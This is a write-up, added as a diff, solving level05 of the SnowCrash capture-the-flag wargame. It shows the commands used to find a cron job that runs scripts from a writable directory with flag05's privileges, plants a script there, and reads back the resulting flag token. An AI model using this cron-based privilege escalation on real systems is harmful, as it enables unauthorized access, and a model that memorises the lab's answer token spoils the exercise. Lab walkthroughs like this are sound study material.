@@ -1,0 +1,77 @@
+We use "ls -l" in our home directory to check if there is any binary.
+
+level05@SnowCrash:~$ ls -l
+total 0
+
+Well we found nothing, so we use the find command to see if we find something.
+
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+Aha! We are successful this time, now we check what's in this path.
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+By analyzing the script we understand that it execute all executables in "/opt/openarenaserver/*" (bash -x "$I") -x only shows the command executed in the terminal.
+
+Also by doing an ls -l on the path we see this script runs with flag05 privileges:
+[......]
+-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+[......]
+
+Now we need to find out where this script is triggered.
+
+So we just did a big search to find anything related with the script and the level05 simultaneously
+
+find / openarenaserver 2>/dev/null | grep "level05"
+/etc/apache2/sites-available/level05.conf
+/etc/apache2/sites-enabled/level05.conf
+/var/mail/level05
+/rofs/etc/apache2/sites-available/level05.conf
+/rofs/etc/apache2/sites-enabled/level05.conf
+/rofs/var/mail/level05
+
+As we can see, we found the there is a mail with the name of level05, we check it.
+
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Aha! We find that there is cron job that is done every 2 minutes that executes the script as flag05.
+
+Now the exploit is Simple, we create a script that executes getflag command in /tmp where we can give it executable rules then move it to (/opt/openarenaserver/) and that script also send getflag output into a file also located in /tmp.
+
+
+level05@SnowCrash:~$ vi /tmp/exploit.sh
+
+#!/bin/bash
+
+/bin/getflag > /tmp/flag.txt
+
+
+level05@SnowCrash:~$ chmod 777 /tmp/exploit.sh
+
+level05@SnowCrash:~$ mv /tmp/exploit.sh /opt/openarenaserver/.
+
+level05@SnowCrash:~$ cd /opt/openarenaserver
+level05@SnowCrash:/opt/openarenaserver$ ls -l
+total 4
+-rwxrwxrwx 1 level05 level05 42 Aug 20 03:40 exploit.sh
+
+Then we just wait 2 mins...
+
+We re check and see that the file is gone :
+
+level05@SnowCrash:/opt/openarenaserver$ ls -l
+total 0
+
+So now we just cat where we sent the output.
+
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
